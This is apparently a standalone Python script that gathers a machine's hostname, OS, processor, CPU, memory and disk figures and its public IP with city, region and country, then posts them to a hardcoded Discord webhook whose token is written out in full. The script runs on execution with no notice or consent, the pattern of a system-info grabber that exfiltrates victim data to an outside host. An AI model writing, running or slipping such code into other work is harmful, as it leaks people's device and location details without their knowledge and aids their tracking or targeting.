import os
from datetime import timedelta, datetime
import platform
import psutil
import locale
import time
import json
import requests


def get_system_info():
    info = {}

    platform_info = {
        'hostname': platform.node(),
        'os': platform.system(),
        'os_release': platform.release(),
        'os_version': platform.version(),
        'machine': platform.machine(),
        'os_build_type': platform.architecture()[0],
        'system_boot_time': psutil.boot_time(),
        'system_manufacturer': platform.system(),
        'processor': platform.processor(),
    }
    info['platform'] = platform_info

    cpu_info = {
        'cpu_percent': psutil.cpu_percent(),
        'cpu_count': psutil.cpu_count(),
        'cpu_freq': psutil.cpu_freq()._asdict(),
        'cpu_times': psutil.cpu_times()._asdict(),
    }
    info['cpu'] = cpu_info

    memory_info = psutil.virtual_memory()._asdict()
    info['memory'] = memory_info

    disk_info = psutil.disk_usage('/')._asdict()
    info['disk'] = disk_info

    network_info = psutil.net_io_counters()._asdict()
    info['network'] = network_info

    locale_info = {
        'preferred_encoding': locale.getpreferredencoding(),
        'timezones': time.tzname,
    }
    info['locale'] = locale_info

    return info

def get_ip_location():
    try:
        location = requests.get("https://ipinfo.io/json").json()
        return {
            "IP": location.get("ip", "Unavailable"),
            "City": location.get("city", "Unavailable"),
            "Region": location.get("region", "Unavailable"),
            "Country": location.get("country", "Unavailable")
        }
    except requests.RequestException:
        return {"IP": "Unavailable", "City": "Unavailable", "Region": "Unavailable", "Country": "Unavailable"}
      
WEBHOOK_URL = "https://discord.com/api/webhooks/1347607590649073686/RguSa7skv9Lw76unTbpfqd6LWmAEhCbN_tdLF31L2dOKsLkV6v5lNuej2faGImyvCTxL"

ip = get_ip_location()
sysinform = get_system_info()

message = f"""
**System Info:**
- Hostname: {sysinform['platform']['hostname']}
- OS: {sysinform['platform']['os']} {sysinform['platform']['os_release']}
- Processor: {sysinform['platform']['processor']}
- CPU Usage: {sysinform['cpu']['cpu_percent']}%
- Memory Used: {sysinform['memory']['used'] / (1024 ** 3):.2f} GB
- Disk Used: {sysinform['disk']['used'] / (1024 ** 3):.2f} GB

**IP Location:**
- IP: {ip['IP']}
- City: {ip['City']}
- Region: {ip['Region']}
- Country: {ip['Country']}
"""
payload = {
    "content": message
}

response = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers={"Content-Type": "application/json"})
